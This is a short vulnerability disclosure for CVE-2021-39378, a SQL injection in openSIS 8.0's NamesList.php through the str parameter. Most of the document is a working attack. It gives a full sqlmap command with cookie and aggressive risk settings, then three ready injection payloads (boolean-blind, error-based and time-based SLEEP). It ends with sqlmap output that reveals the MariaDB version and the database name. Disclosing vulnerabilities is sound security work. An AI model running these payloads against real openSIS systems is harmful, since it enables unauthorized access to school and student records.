# OPENSIS 8.0 SQL INJECTION VULNERABILITY CVE-2021-39378

A SQL Injection vulnerability exists in version 8.0 of openSIS when MySQL (MariaDB) is being used as the application database. A malicious attacker can issue SQL commands to the MySQL (MariaDB) database through the vulnerable str= parameter. 

Vulnerable PHP Page:

NamesList.php

Vulnerable Payload

sqlmap -u "http://localhost:8081/NamesList.php?str=J&block_id=1" --cookie="PHPSESSID=s8n71sv8ji77mdjkmh6cj1ik5d; miniSidebar=0" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" --referer="http://localhost:8081/Modules.php?modname=miscellaneous/Portal.php&failed_login=0" --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --level=3 --risk=3 --threads=8 --time-sec=5 -b --current-db --batch --answers="crack=N,dict=N,continue=Y,quit=N"

SQL Injection:

http://localhost:8081/NamesList.php             
```
Parameter: str (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: str=J%' AND 4830=4830 AND 'mmPI%'='mmPI&block_id=1

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: str=J%' AND (SELECT 5261 FROM(SELECT COUNT(*),CONCAT(0x716b6b7a71,(SELECT (ELT(5261=5261,1))),0x7176706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'YfUK%'='YfUK&block_id=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: str=J%' AND (SELECT 9071 FROM (SELECT(SLEEP(5)))hYUR) AND 'vbOt%'='vbOt&block_id=1

[18:41:23] [INFO] testing MySQL
[18:41:23] [WARNING] reflective value(s) found and filtering out
[18:41:23] [INFO] confirming MySQL
[18:41:23] [INFO] the back-end DBMS is MySQL
[18:41:23] [INFO] fetching banner
[18:41:23] [INFO] resumed: '10.5.11-MariaDB-1'
web application technology: PHP 7.4.21
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
banner: '10.5.11-MariaDB-1'
[18:41:23] [INFO] fetching current database
[18:41:23] [INFO] resumed: 'opensis5'
current database: 'opensis5'
```

Discovered by Nathan Johnson, August 2021
